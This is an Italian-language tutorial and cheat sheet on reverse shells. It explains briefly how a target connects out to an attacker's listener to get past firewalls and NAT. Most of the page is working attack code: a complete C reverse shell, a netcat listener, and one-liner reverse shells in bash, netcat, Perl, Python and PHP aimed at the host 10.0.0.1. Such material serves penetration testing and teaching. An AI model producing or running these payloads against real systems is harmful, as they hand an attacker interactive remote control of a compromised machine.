
## Architettura di una Reverse Shell

Una **Reverse Shell** è una tecnica di sessione interattiva in cui l'endpoint remoto (target) inizializza una connessione TCP/IP verso un listener locale (attaccante). Questo ribaltamento dei ruoli client-server è fondamentale per l'operatività in ambienti protetti da perimetri di sicurezza restrittivi.

### Funzionamento


1. **Creazione del socket**: Apertura di un socket per la comunicazione di rete.
    
2. **Instaurazione del tunnel**: Tentativo di connessione verso l'host remoto.
    
3. **I/O Redirection**: redirect dei descrittori standard (stdin, stdout, stderr) sul socket.
    
4. **Process Execution**: Esecuzione di un processo shell.

### A cosa serve

- **Bypass del Firewall (Ingress Filtering):** La maggior parte dei firewall _Stateful Inspection_ è configurata per negare connessioni non sollecitate dall'esterno verso l'interno. Poiché la Reverse Shell genera traffico **outbound**, viene spesso classificata come traffico legittimo (es. porta 443/HTTPS).
    
- **Gestione del NAT:** In presenza di Network Address Translation, l'attaccante non può raggiungere direttamente l'IP privato del target. La reverse shell risolve il problema, essendo il target a uscire verso l'IP pubblico dell'attaccante.

## Esempio in C

```C
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 443;
    struct sockaddr_in revsockaddr;
    
    // Creazione del socket di rete
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1"); //stabilisce il tunnel

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    // Attraverso il socket passeranno stdout, stdin e stderr
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
	
	// infine, esegui /bin/sh
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

[\(source\)](https://github.com/nicholasaleks/reverse-shells#c)
## Cheat Sheet

### Listening 

**sulla macchina attaccante**

```bash
nc -lvnp 443
```

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Netcat

```bash
nc -e /bin/sh 10.0.0.1 1234
```


```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.0.0.1 1234 >/tmp/f
```

### PERL

```perl
use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};

```

### Python

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### PHP

```php
$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");
```

